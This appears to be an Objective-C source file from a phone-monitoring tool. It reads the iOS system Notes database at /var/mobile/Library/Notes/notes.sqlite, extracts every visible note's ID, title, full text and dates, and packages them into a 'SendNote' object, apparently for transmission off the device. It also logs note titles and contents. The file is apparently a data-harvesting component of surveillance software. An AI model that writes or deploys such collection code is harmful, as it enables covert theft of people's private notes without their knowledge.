//
//  NoteDataProvider.m
//  NoteManager
//
//  Created by Ophat on 1/17/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "NoteDataProvider.h"
#import "DateTimeFormat.h"

#import "Note.h"
#import "SendNote.h"		// in ProtocolBuilder

#import "NoteContext.h"
#import "NoteObject.h"
#import <CoreData/NSPersistentStoreCoordinator.h>


@implementation NoteDataProvider

//@synthesize mNoteContext;
@synthesize mNoteCount;
@synthesize mNoteIndex;

- (id) init {
	self = [super init];
	if (self != nil) {

	}
	return self;
}

- (BOOL) hasNext {
	DLog (@"hasnext index %d (%d)", mNoteIndex, (mNoteIndex < mNoteCount))
	return  (mNoteIndex < mNoteCount);
}

- (id) getObject {
	// 1. Create Note object
	// 2. Set all properties
	// 3. Return that Note object in step 1 as auto release
	DLog (@">>>>>> getObject");
	Note *note = nil;
	if (mNoteIndex < mNoteCount) {
		NoteObject *noteObject = [[mNoteContext allVisibleNotes]objectAtIndex:mNoteIndex];			
		DLog (@"Note title >>>> %@",[noteObject title] )		
		DLog (@"Note content plain >> %@",[noteObject contentAsPlainText])		
		note = [[Note alloc] init];
		[note setMAppId:kAppIdNative];
		[note setMNoteId:[[noteObject noteId] absoluteString]];
		[note setMTitle:[noteObject title]];
		[note setMContent:[noteObject contentAsPlainText]];
		[note setMCreationDateTime:[DateTimeFormat phoenixDateTime:[noteObject creationDate]]];
		[note setMLastModifiedDateTime:[DateTimeFormat phoenixDateTime:[noteObject modificationDate]]];
		[note autorelease];
		
		mNoteIndex++;
	} else {
		DLog (@" Invalid index of Note");
	}
	
	return (note);
}

- (id) commandData {	
	if (mNoteContext) {
		[mNoteContext release];
		mNoteContext = nil;
	}
	mNoteContext						= [[NoteContext alloc] init];		
	NSURL *url							= [NSURL URLWithString:@"file://localhost/var/mobile/Library/Notes/notes.sqlite"];
	NSPersistentStoreCoordinator *psc	= [mNoteContext persistentStoreCoordinator];
	[psc persistentStoreForURL:url];
	[psc setURL:url forPersistentStore:[[psc persistentStores] objectAtIndex:0]];		
	
	[self setMNoteIndex:0];
	[self setMNoteCount:[[mNoteContext allVisibleNotes]count]];
	SendNote* sendNote = [[SendNote alloc] init];
	[sendNote setMNoteCount:[self mNoteCount]];
	[sendNote setMNoteDataProvider:self];
	[sendNote autorelease];
	return (sendNote);
}

- (void) dealloc {
	[mNoteContext release];
	mNoteContext = nil;
	[super dealloc];
}


@end
